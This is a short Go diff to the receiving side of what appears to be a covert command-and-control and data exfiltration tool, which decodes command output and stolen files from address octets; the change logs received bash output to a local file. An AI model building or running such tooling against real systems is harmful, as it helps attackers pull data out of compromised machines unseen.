@@ -67,7 +67,7 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 		} else {
 			switch command {
 			case "/b/": // Begin collecting the output bytes of the bash command
-				fmt.Printf("[!] Collecting output of the executed command. Bash command output will be displayed here, while exfiltrated data will be saved to a file.\n")
+				fmt.Printf("[!] Collecting output of the executed command.\n")
 				*c = true
 			case "/f/": // Finish collecting the output bytes of the bash command, and output the gathered data.
 				if *m == "exfil" {
@@ -81,7 +81,16 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 					}
 					fmt.Printf("[$] Completed exfiltration of file. Wrote to 'recovered'.\n")
 				} else {
-					fmt.Printf("~$ %v\n", string(*lsb))
+					fmt.Printf("%v\n", string(*lsb))
+					f, _ := os.OpenFile("bash_history", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+					if _, err := f.Write(*lsb); err != nil {
+						f.Close()
+						log.Fatal(err)
+					}
+					if err := f.Close(); err != nil {
+						log.Fatal(err)
+					}
+					fmt.Printf("[$] Appended command output to 'bash_history'.\n")
 				}
 
 				*lsb = []byte{}
